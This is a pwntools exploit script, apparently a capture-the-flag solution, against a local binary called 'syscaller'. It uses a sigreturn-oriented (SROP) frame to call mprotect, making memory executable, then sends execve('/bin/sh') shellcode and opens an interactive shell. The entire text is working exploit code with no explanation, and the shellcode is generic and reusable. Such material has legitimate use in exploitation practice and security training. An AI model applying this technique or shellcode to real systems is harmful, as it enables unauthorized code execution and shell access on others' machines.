from pwn import *

target = process("./syscaller")

context.arch = "amd64"

r12 = "0"*8
r11 = "1"*8
rdi = "0"*8
rax = p64(0xf)
rbx = "0"*8
rdx = "1"*8
rsi = "0"*8
rdi = "1"*8

payload = ""
payload += r12
payload += r11
payload += rdi
payload += rax
payload += rbx
payload += rdx
payload += rsi
payload += rdi

frame = SigreturnFrame()

frame.rip = 0x400104
frame.rsp = 0x40011a
frame.rax = 10
frame.rdi = 0x400000
frame.rsi = 0x800
frame.rdx = 7

payload += str(frame)
target.sendline(payload)

import time
time.sleep(1.1)
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
target.sendline(shellcode)
target.interactive()
